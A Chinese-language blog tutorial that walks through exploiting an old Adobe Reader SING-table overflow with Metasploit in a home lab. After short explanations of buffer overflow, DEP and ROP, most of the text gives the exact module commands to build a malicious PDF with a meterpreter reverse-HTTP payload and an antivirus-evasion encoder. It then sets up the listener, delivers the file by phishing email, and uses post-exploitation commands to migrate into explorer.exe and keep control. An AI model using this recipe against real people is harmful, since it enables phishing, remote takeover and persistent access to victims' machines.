# 用Metasploit玩一个稍微高级一点儿的攻击

上期内容的结尾，咱们说以后要开始用Metasploit玩点儿高级的攻击实践，本期就先拿Adobe Reader老版本的一个漏洞开刀。

 

先来看一段天书：

 

Adobe Reader 9.3.4之前的版本，SING表对象中的uniqueName参数存在栈缓冲区溢出漏洞，Metasploit里提供了一个名为adobe\_cooltype\_sing的渗透测试模块对此漏洞进行利用，这个渗透测试模块采用了ROP技术来绕过DEP，针对开启DEP了Win7和WinXP-SP3都是有效的。

 

晕了吧，别急，虽然这里是技术实践博客，但顶着“史上最具参考性”的虚名，本博主必须尽量用通俗的语言让各位看官知其然且知其所以然。

 

缓冲区溢出，是现代计算机的一大先天缺陷，即对数据和代码没有明确区分，攻击者可以将代码（shellcode）放置于数据段，让系统去执行，这样就可以在系统里为所欲为了。

 

DEP（Data Execution Prevention），数据执行保护，微软从Windows XP SP2开始引入该技术，将程序的数据段标记为不可执行，当攻击者要在数据段执行shellcode时，CPU就会抛出异常，从而转向异常处理，而不会执行shellcode。在Win7里可以通过控制面板—\>系统—\>高级系统设置—\>性能设置—\>数据执行保护来查看DEP的默认设置，

![](../Images/cfad5004253fab961c35405fe12d737f.png)  

ROP（Return-oriented Programming），面向返回的编程，是一种基于代码复用的攻击技术，攻击者从已有的库或可执行文件中提取指令片段，构建恶意代码。说重点吧，ROP绕过DEP无外乎两个思路：一个是新建一个可执行的内存区域，然后把shellcode复制进去；另一个就是使用Windows API关闭（停用）DEP保护。

好了，概念普及完成，开始实践。

 

1、 制作恶意文件

 

使用渗透测试模块，use windows/fileformat/adobe\_cooltype\_sing，

设置payload类型，set payload windows/meterpreter/reverse\_http，

设置控制端地址，set LHOST 192.168.1.4，

设置控制端端口，set LPORT 80，

给恶意文件起名字，set FILENAME demo.pdf，

使用免杀编码，set encoder x86/shikata\_ga\_nai，（这步很关键，不然很容易被杀软查杀）

执行，exploit，

 

本博主是在Kali Linux虚拟机里实践的，因此需要把生成的文件通过ftp传出来，

![](../Images/04892777dace877a1127c00b23233c83.png)  

2、 在控制端建立监听服务

 

使用渗透测试模块，use exploit/multi/handler，

设置payload类型，set payload windows/meterpreter/reverse\_http，

设置控制端地址，set LHOST 192.168.1.4，

设置控制端端口，set LPORT 80，

执行，exploit，

![](../Images/9df02f1d31351b57bb8b03850f558100.png)  

3、 钓鱼攻击

 

写一封钓鱼邮件发给受害者，受害者（Win7虚拟机，已预装了存在漏洞的软件Adobe Reader 9.3.0英文版）收到钓鱼邮件，

![](../Images/dc902a87d5e7889454ff6895b85ae395.png)  

受害者打开钓鱼邮件，

![](../Images/728a85e3d8982396f2be6aa07bca1227.png)  

把附件下载到本地，

![](../Images/1f43d7a8d4650ddc5f0ecd124b000777.png)  

4、 受害者打开文件，被远程控制

 

这里为了验证Metasploit的adobe\_cooltype\_sing渗透测试模块确实使用了ROP技术，本博主先在Win7虚拟机（受害者）内更改了DEP的默认设置，

![](../Images/4164d4a7e8d2e909a2944f72eaef542a.png)  

受害者打开文件，Adobe Reader崩溃了，对于小白来说，一般不会怀疑，就直接关掉了，

![](../Images/254d0701035a7ca3372c267a408ba525.png)  

控制端收到受害者的控制命令行，

![](../Images/5974d291c1a023db7c4461dfa4629ac8.png)  

控制端可以通过sysinfo命令查看受害者主机信息，

通过ps命令查看受害者主机上当前的进程，

通过migrate命令将控制进程迁移到系统进程（例如explorer.exe）上，

即便受害者将Adobe Reader的进程杀掉，也能继续维持控制进程，

![](../Images/2ff718226c7fd5f50026a4af39f5a044.png)
